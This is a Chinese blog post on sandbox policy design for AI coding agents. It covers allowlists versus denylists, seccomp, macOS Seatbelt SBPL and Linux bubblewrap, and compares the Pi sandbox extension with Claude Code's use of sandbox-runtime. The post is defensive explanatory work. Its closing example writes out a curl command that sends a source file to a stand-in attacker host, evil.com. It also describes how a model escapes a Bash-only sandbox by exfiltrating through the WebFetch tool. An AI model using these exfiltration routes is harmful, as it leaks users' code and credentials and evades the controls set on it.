---
title: "Pi Extension 的第一枪：Sandbox Extension（2）"
slug: pi-sandbox-extension-part-2
date: 2026-08-13 07:56:00
updated: 2026-08-13 07:56:00
categories:
  - "工程实践"
  - "Agent 系统"
tags:
  - "Agent"
  - "Sandbox"
  - "安全策略"
  - "macOS"
  - "Linux"
  - "pi"
cover: /images/posts/astraflow-cover.webp
description: "对比白名单与黑名单策略，分析 macOS Seatbelt、Linux bubblewrap 以及 pi 沙箱的策略设计。"
---

对比白名单与黑名单策略，分析 macOS Seatbelt、Linux bubblewrap 以及 pi 沙箱的策略设计。

<!-- more -->

> 拦得住的叫策略。拦不住的叫摆设。
> 
> 天下策略，不过四字：该拦则拦。
> 
> 难的从来不是那四个字，是该字怎么写。

**沙箱策略设计：保护与自由的拉锯**

沙箱必须靠内核，不能靠自律。但"内核能拦"和"拦得恰到好处"是两回事。拦多了，`npm install` 装不上包，`git push` 推不了代码，智能体变废物。拦少了，跟没拦一样。

这就是策略设计的艺术，在保护和自由之间画一条完美的分割线。

读完这篇，你会知道那条线画在哪里——以及为什么 Flatpak 画歪了被人诟病了好几年（**default allow / blacklist** 的典型问题，往下读）。

## 白名单 vs 黑名单：选错了就是灾难

沙箱策略本质上只有两种思路：

| 思路 | 逻辑 | 默认行为 |
| :-- | :-- | :-- |
| **白名单**（allowlist） | "列出允许的，其余全拦" | 新操作 = 被拦 |
| **黑名单**（denylist） | "列出禁止的，其余放行" | 新操作 = 放行 |

还记得前面的银行比喻吗？syscall 就是去不同窗口办业务——5 号窗口打开文件，1 号窗口退出程序，等等。Linux 有个功能叫 **seccomp**（secure computing mode），它做的事就是：限制一个进程只能去哪些窗口。比如"你只能去 `read`、`write`、`exit` 这三个窗口，去别的窗口直接叉出去"。macOS 的 `sandbox-exec` 管的是"你在窗口里能办什么业务"（读哪些文件、连哪些网），seccomp 更狠——直接说"你连窗口都不许去"。

Docker 默认就开着 seccomp：允许大约 256 种 syscall，拦掉大约 44 种危险的（比如 `unshare`——创建新命名空间、`init_module`——加载内核模块）。

那 seccomp 的过滤器怎么写？也是白名单和黑名单两种思路。Linux 内核的 seccomp 文档\[2\] 直接说了：

> "It  is strongly recommended to use an allow-list approach whenever possible  because such an approach is more robust and simple. A deny-list will  have to be updated whenever a potentially dangerous system call is  added."

翻译：黑名单是打地鼠游戏——每次内核加一个新 syscall，你得手动去拦它，忘了就是漏洞。白名单反过来——新 syscall 默认被拦，你得手动去放行，忘了最多是程序报错，不是安全事故。

> 这不是理论风险。2021 年 Flatpak（Linux 上的应用沙箱框架）爆了 CVE-2021-41133\[3\]：它的 seccomp 过滤器漏掉了几个新加的文件系统相关 syscall，沙箱内的恶意应用可以利用这些 syscall 冒充未沙箱化的进程。原因就是 Flatpak 用的是黑名单模式——新 syscall 默认放行了。

**但白名单也有代价：** 你得知道程序需要什么。`npm install` 会调哪些 syscall？一个 Python C 扩展编译时需要什么文件系统权限？如果你白名单里少了一项，程序就莫名其妙地失败——而且报错信息通常是一个干巴巴的 `Operation not permitted`，不告诉你是哪条规则拦的。

Pi 的 sandbox extension 选了一个折中：**文件系统白名单 + 网络白名单，但默认允许进程执行和 syscall。** 它不像 Docker 那样用 seccomp 限制 syscall 种类，而是只管"能访问什么文件"和"能连什么网"。这个选择是故意的——我一会儿讲为什么。

## macOS Seatbelt 策略长什么样

前面用的 `sandbox-exec -p '...'` 只是演示。真实的策略文件用 SBPL（Sandbox Profile Language）写，一种 Lisp 风格的语言。Chromium 浏览器、macOS 系统服务都用它。

下面这段**不是 Pi sandbox extension 的默认配置**——它来自 agent-safehouse\[4\] 项目，一个专门为 AI 编程智能体设计的独立 SBPL 策略集。放在这里是为了让你看看"真实的 SBPL 长什么样"：

```
(version 1)(deny default)                              ; 默认拒绝一切;; === 基础运行时 ===(allow process-exec)                        ; 允许执行程序(allow process-fork)                        ; 允许 fork 子进程(allow signal (target same-sandbox))        ; 允许给同沙箱进程发信号;; === 文件读取 ===(allow file-read*    (subpath "/usr")                        ; 系统工具和库    (subpath "/bin")    (subpath "/Library/Frameworks")    (subpath "/System"));; === 项目目录读写 ===(allow file-read* file-write*    (subpath "/Users/you/projects/myapp")   ; 你的项目    (subpath "/tmp"))                       ; 临时文件;; === 包管理器缓存 ===(allow file-read* file-write*    (home-subpath "/.npm")                  ; npm 缓存    (home-subpath "/.cache/pip")            ; pip 缓存    (home-subpath "/.cargo"))              ; rust 缓存;; === 明确禁止的敏感文件 ===(deny file-read*    (home-subpath "/.ssh")                  ; SSH 密钥    (home-subpath "/.aws")                  ; AWS 凭证    (home-subpath "/.gnupg"))              ; GPG 密钥;; === 网络 ===(allow network-outbound (remote ip))        ; 允许所有出站连接(allow network-bind (local ip))            ; 允许绑定本地端口
```

几个细节值得注意（这些是 SBPL 语言本身的特点，不管谁写的策略都适用）：

**`(deny default)` 在最上面** — 这是白名单模式的起点。任何没被 `allow` 提到的操作全被拦住。agent-safehouse 选了这种最严格的起点。

**文件系统操作分得很细** — `file-read*`（读）、`file-write*`（写）、`file-read-metadata`（只看文件属性不读内容）是不同的权限。你可以让智能体 `ls` 一个目录但不能读里面的文件。

**这个示例里网络部分很粗暴** — `(allow network-outbound (remote ip))` 允许所有出站连接。agent-safehouse 选择在 SBPL 层放行网络，因为 SBPL 工作在 socket 层面，它看到的是 IP 地址和端口，不是域名。当你的代码调 `connect("registry.npmjs.org", 443)` 时，内核看到的是 `connect(104.16.1.35, 443)`。SBPL 没法判断这个 IP 属于哪个域名。

Pi 的 sandbox extension 走的是不同的路：它通过 `sandbox-runtime` 的代理来过滤域名（前面讲过），所以 Pi 的策略里网络*不是*全放行的——白名单外的域名会被代理拒绝。这个白名单就是 前面看过的那个 `allowedDomains` 字段，配置在 `~/.pi/agent/extensions/sandbox.json`（全局）或 `.pi/sandbox.json`（项目级）里。

> **为什么网络域名过滤这么难？**
> 
> agent-safehouse\[4\]  项目的文档说得很直白："blocking exfiltration/C2 is explicitly NOT a goal for this  sandbox." 因为要在内核层做域名过滤，你需要一个额外的 DNS 代理——在沙箱外面跑一个只解析白名单域名的 DNS  服务器，然后强制沙箱内的程序通过它解析。这不是一个 SBPL 策略能搞定的事。

Pi 的 sandbox extension 里的 `allowedDomains` 配置正是走这条路——它不是在 SBPL 里过滤，而是在沙箱外面多跑一个代理程序，所有出站网络流量必须经过它，它只放行白名单域名的连接。程序想访问 `registry.npmjs.org`？代理对照白名单，在就放行，不在就拒绝。Claude Code 用的也是同一个包（`@anthropic-ai/sandbox-runtime`）里的代理方案。

**那入站呢？**（别人连进你的电脑）在编程智能体场景下不太重要。智能体的危险操作几乎都是"往外发"——把密钥传到外部服务器、连接攻击者的控制服务器。入站场景主要是 `localhost` 的开发服务器（Vite 跑在 3000 端口之类的），这是本机自己连自己，不经过外网。而且你家里的路由器（NAT）本来就挡着外面的入站连接，操作系统防火墙也默认拒绝。所以 Pi 的 sandbox extension 不管入站，agent-safehouse\[4\] 也明确说"限制入站不是我们的目标"。

## Linux bubblewrap：另一套语言，同一个思路

Linux 没有 SBPL，但有 bubblewrap（bwrap）。它不写策略文件，而是通过命令行参数构造一个隔离的文件系统视图：

```
bwrap \    --ro-bind /usr /usr \                   # /usr 只读    --ro-bind /lib /lib \                   # 系统库只读    --ro-bind /etc/resolv.conf /etc/resolv.conf \  # DNS 配置只读    --proc /proc \                          # 挂载 /proc    --dev /dev \                            # 挂载 /dev    --tmpfs /tmp \                          # 空的 /tmp    --bind $PWD /workspace \                # 项目目录读写    --unshare-pid \                         # 独立进程表    --unshare-net \                         # 独立网络（仅 loopback）    --new-session \                         # 新的终端会话    --chdir /workspace \    bash -c 'npm install'
```

对比一下两种方式：

| 维度 | macOS Seatbelt | Linux bubblewrap |
| :-- | :-- | :-- |
| 配置方式 | SBPL 策略文件 | 命令行参数 |
| 文件隔离 | 规则匹配（允许/拒绝路径） | 命名空间（重建文件系统视图） |
| 网络隔离 | socket 级别规则 | 命名空间（全有或全无） |
| 需要 root | 不需要 | 不需要（用 user namespace） |
| 粒度 | 可以控制"读 vs 写 vs 元数据" | 只能控制"可见 vs 不可见 vs 只读" |

bubblewrap 的 `--unshare-net` 是全有或全无的：要么有完整网络，要么只有 loopback。中间状态（"只允许连特定域名"）需要额外的工具配合，比如 slirp4netns\[5\]（用户态网络栈）或沙箱内的代理。

## Pi sandbox extension 的策略取舍

回到 前面看过的那个默认配置：

```
const DEFAULT_CONFIG: SandboxConfig = {  network: {    allowedDomains: ["npmjs.org", "*.npmjs.org", "github.com", ...],    deniedDomains: [],  },  filesystem: {    denyRead: ["~/.ssh", "~/.aws", "~/.gnupg"],    allowWrite: [".", "/tmp"],    denyWrite: [".env", ".env.*", "*.pem", "*.key"],  },};
```

它的策略哲学是：

**1\. 保护凭证 > 限制行动范围**

`denyRead: ["~/.ssh", "~/.aws", "~/.gnupg"]` 是最关键的规则。AI 能做的最危险的事不是删文件（你有 git），而是**读走你的密钥**。一旦 SSH 密钥泄露，攻击者能访问你所有服务器。一旦 AWS 凭证泄露，你的云账单会变得很刺激。

**2\. 网络白名单走代理，不走内核**

前面讲过了——SBPL 管不了域名，所以 `allowedDomains` 走的是 `sandbox-runtime` 启动的代理服务器。内核管文件，代理管网络域名，各管各的层。

**3\. 文件写入限制比较宽松**

`allowWrite: [".", "/tmp"]` 意味着当前目录和 `/tmp` 都能写。这是故意的——编程智能体需要写代码、生成文件、跑构建。如果把写入限制得太死（比如只允许写特定文件名），正常开发流程会不停触发拒绝。

**4\. 不做 syscall 过滤**

Pi 的 sandbox extension 不用 seccomp-bpf 限制 syscall 类型。它不管你调 `fork()`、`exec()`、`mmap()` 还是什么——只管文件和网络。为什么？因为 AI 编程智能体要跑编译器、测试框架、构建工具，这些程序用的 syscall 种类极其多样且不可预测。用 seccomp 白名单，你会花大量时间调试"为什么 GCC 跑到一半挂了"。

我去来回考虑过这个——seccomp  确实能提供更强的隔离，但对编程智能体场景来说，它的误杀率太高，调试成本超过了安全收益。Docker 能用 seccomp  是因为容器里跑的程序相对固定，你可以提前摸清它需要哪些 syscall。智能体不行——它下一秒要跑什么取决于模型的输出，无法预测。

## Claude Code 怎么做的：对比

Claude Code（Anthropic 的官方编程智能体 CLI）和 Pi 用的是*同一个底层包*（`@anthropic-ai/sandbox-runtime`）。这个包不只是一个代理——它是整套沙箱方案：生成内核级文件系统策略（macOS 上生成 SBPL，Linux 上生成 bwrap 参数）+ 启动网络代理做域名过滤 + 提供 `wrapWithSandbox()` API 把命令包起来。两家调的是同一个方法，底层干的活一模一样。区别只在架构选择：

Claude Code vs Pi 对比

核心区别：

| 维度 | Claude Code | Pi |
| :-- | :-- | :-- |
| 默认状态 | Bash 命令自动进内核级沙箱 | 无沙箱，需手动装 extension |
| Bash 沙箱强度 | 真正的内核强制执行，和 Pi 一样硬 | 同上（同一个底层包） |
| 非 Bash 工具（Read/Edit 等） | 靠权限系统（弹窗问你"允许吗？"） | 无限制 |
| MCP 服务器/Hooks | 没人管，不在沙箱内 | 没人管，不在沙箱内 |
| 想全管住怎么办 | 用 `sandbox-runtime` 包整个进程（官方提供一行命令） | 同样可以用 `sandbox-runtime`，或者 Docker / Gondolin VM / OpenShell（文档推荐这些） |
| 权限粒度 | 命令级（`allow Bash(npm run build)`） | 无（extension 内统一策略） |
| 凭证处理 | 代理可替换 sentinel 为真实凭证 | 无此功能 |

**Claude Code 的优势：开箱即用。** 普通用户不需要理解沙箱原理，Bash 命令默认就被限制了。权限系统还会在执行前问你"允许吗？"——相当于多加了一层人工审核。

**Pi 的优势：诚实和可组合。** Claude Code 的"内置沙箱"只管 Bash——如果模型通过 MCP 服务器或 hooks 执行操作，沙箱管不到。Pi 的态度是：既然管不全就不装作能管，让你自己选择完整的隔离方案（把整个 Pi 丢进容器里，一切都被隔离，没有盲区）。

**交互方式的根本区别：** 这两家对"怎么管 shell 命令"的思路完全不同——

-   **Claude Code** = 执行前拦你。命令跑之前弹窗问"允许执行 `npm install` 吗？"，你点了允许才跑。门口站保安。
-   **Pi + sandbox extension** = 不拦，直接跑。但命令跑起来之后，能碰到的东西被锁死了——读不了 `~/.ssh`，连不了白名单外的域名，写不了 `.env` 文件。不设保安，锁抽屉。

Pi 没有 `bypassPermissions` 这个选项，因为它压根没有"执行前审批"这一层。所有命令都会跑，安全靠的是跑起来之后内核和代理的限制，不是跑之前的人工批准。

> **"默认安全但有盲区" vs "默认不安全但可无盲区"**
> 
> 这是安全设计中一个经典取舍。Claude Code 选了前者——大多数用户受到保护，但高级场景（MCP、hooks）留了口子。Pi 选了后者——逼你主动做选择，但选了之后保护是完整的。
> 
> 哪个"对"取决于你的威胁模型。如果你担心的是"模型偶尔犯蠢删了文件"，Claude Code 的默认沙箱就够了。如果你担心的是"模型被 prompt injection 攻击后试图偷走凭证"，你需要完整的容器隔离——两家都得额外配置。

### "全管住"具体怎么做 🥱

表格里提到"用 `sandbox-runtime` 包整个进程"，具体就是一行命令：

```
# 包住 Claude Codenpx @anthropic-ai/sandbox-runtime claude# 包住 Pinpx @anthropic-ai/sandbox-runtime pi
```

它做的事：

1.  读取配置文件 `~/.srt-settings.json`（格式和 Pi sandbox extension 的 JSON 一样）
2.  调用 `SandboxManager.initialize()` 启动沙箱（编译策略 + 启动网络代理）
3.  把你传的命令（`claude` 或 `pi`）作为子进程在沙箱里启动

这时候整个 `claude`/`pi` 进程——包括它所有的工具（bash、read、edit、WebFetch）、MCP 服务器、hooks——全都跑在沙箱里。不是只管 bash，是管*一切*。

配置文件 `~/.srt-settings.json`：

```
{  "network": {    "allowedDomains": ["api.anthropic.com", "github.com", "registry.npmjs.org"],    "deniedDomains": []  },  "filesystem": {    "denyRead": ["~/.ssh", "~/.aws"],    "allowWrite": [".", "/tmp"],    "denyWrite": [".env", "*.pem"]  }}
```

和 sandbox extension 的区别：extension 只包 bash 子进程（其他工具不受影响），`srt` CLI 包的是整个主进程（所有操作都受限）。代价是——如果策略配窄了，连 `read` 工具读文件都可能被拦。

**这两种方式不是靠配置文件区分的，是靠启动方式区分的：**

| 方式 | 怎么启动 | 谁在沙箱里 | 配置文件在哪 |
| :-- | :-- | :-- | :-- |
| Sandbox extension | `pi -e sandbox` | 只有 bash 子进程 | `.pi/sandbox.json` |
| `srt` CLI | `npx @anthropic-ai/sandbox-runtime pi` | 整个 Pi 进程 | `~/.srt-settings.json` |

两个配置文件格式一样（都是 `network` + `filesystem`），但作用范围不同。不在同一个文件里，也不需要标记来区分——谁启动的决定管谁。

**举个例子对比。** 假设配置里 `allowedDomains: ["registry.npmjs.org"]`，模型想把你的代码传到 `evil.com`：

场景一：**只用 sandbox extension**（`pi -e sandbox`）

```
AI 调用 Bash: "curl -X POST https://evil.com -d @main.ts"  → 进沙箱 → 代理拒绝 → 连接失败（Bash 被管了）AI 调用 WebFetch 工具访问 https://evil.com  → Pi 主进程直接发请求 → 成功（WebFetch 不在沙箱里）
```

Bash 被拦了，但模型换个工具就绕过去了。

场景二：**用 `srt` CLI**（`npx @anthropic-ai/sandbox-runtime pi`）

```
AI 调用 Bash: "curl -X POST https://evil.com -d @main.ts"  → 整个进程在沙箱里 → 代理拒绝 → 连接失败AI 调用 WebFetch 工具访问 https://evil.com  → Pi 进程本身在沙箱里 → 代理拒绝 → 连接失败
```

不管用什么工具、什么方式发网络请求，都得经过代理。`evil.com` 不在白名单里，全部拒绝，没有漏网的路。

## 策略设计的经验法则

综合上面的分析，给你几条实用的策略设计原则：

**1\. 保护不可逆的东西**

```
可逆的：删了文件        → git checkout 找回来不可逆的：密钥泄露      → 你得轮换所有密钥，检查所有服务不可逆的：数据外传      → 你不知道泄了什么，无法收回
```

沙箱的首要目标是防不可逆的伤害。文件删除？有 git。代码写错？有 code review。但密钥被读走——那是真的完了。所以 `denyRead: ~/.ssh, ~/.aws` 比 `denyWrite: /` 重要得多。

**2\. 白名单网络，黑名单文件系统（写入）**

-   网络：只列出允许连接的域名。没列的全拦。（因为合法的开发网络请求目标是可枚举的：npm registry、GitHub、你的 API endpoint）
-   文件写入：列出禁止写入的位置（`.env`、密钥文件）。没列的放行。（因为智能体需要在各种地方创建文件，你无法预测所有合法路径）

**3\. 错误信息比策略本身更重要**

最糟糕的体验是：命令失败了，只看到 `Operation not permitted`，不知道是哪条规则拦的。好的沙箱实现会告诉你"网络被拦：尝试连接 evil.com，不在 allowedDomains 列表中"。Pi 的 sandbox extension 通过 `SandboxManager` 把拒绝原因传回给模型——模型看到具体原因后可以调整行为，而不是盲目重试。

**4\. 策略要跟着项目走**

这就是 `.pi/sandbox.json` 存在的意义。不同项目需要不同策略：

```
// 前端项目：需要 npm registry + localhost dev server{  "network": {    "allowedDomains": ["registry.npmjs.org", "localhost"]  },  "filesystem": {    "allowWrite": [".", "/tmp", "node_modules"]  }}
```

```
// ML 项目：需要 PyPI + HuggingFace + GPU 设备{  "network": {    "allowedDomains": ["pypi.org", "*.pypi.org", "huggingface.co", "*.huggingface.co"]  },  "filesystem": {    "allowWrite": [".", "/tmp", "~/.cache/huggingface"]  }}
```

把策略文件提交到项目仓库，团队所有人自动共享同一套安全规则。

* * *
